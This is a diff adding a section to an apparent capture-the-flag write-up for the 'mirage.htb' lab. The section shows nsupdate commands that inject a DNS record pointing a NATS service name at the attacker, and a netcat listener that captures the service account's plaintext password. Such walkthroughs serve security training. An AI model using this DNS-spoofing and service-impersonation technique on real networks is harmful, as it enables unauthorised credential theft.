@@ -258,6 +258,28 @@ NATS Configuration Context "dc01.mirage.htb"
 
 I first have to define the context of the system, this is almost like an environment variable in bash
 
+# Credential capture via DNS/service impersonation
+
+```python
+❯❯❯ nsupdate                                                                    
+> server 10.129.232.163
+> update add nats-svc.mirage.htb 60 A 10.10.14.61
+> send
+> 
+```
+
+Ill add a DNS record for my IP
+
+```python
+❯❯❯ nc dc01.mirage.htb 4222 | head -1 | nc -lnvp 4222                           
+listening on [any] 4222 ...
+connect to [10.10.14.61] from (UNKNOWN) [10.129.232.163] 51057
+CONNECT {"verbose":false,"pedantic":false,"user":"Dev_Account_A","pass":"hx5h7F5554fP@1337!","tls_required":false,"name":"NATS CLI Version 0.2.2","lang":"go","version":"1.41.1","protocol":1,"echo":true,"headers":true,"no_responders":true}
+PING
+```
+
+I have now captured plaintext credentials
+
 
 
 
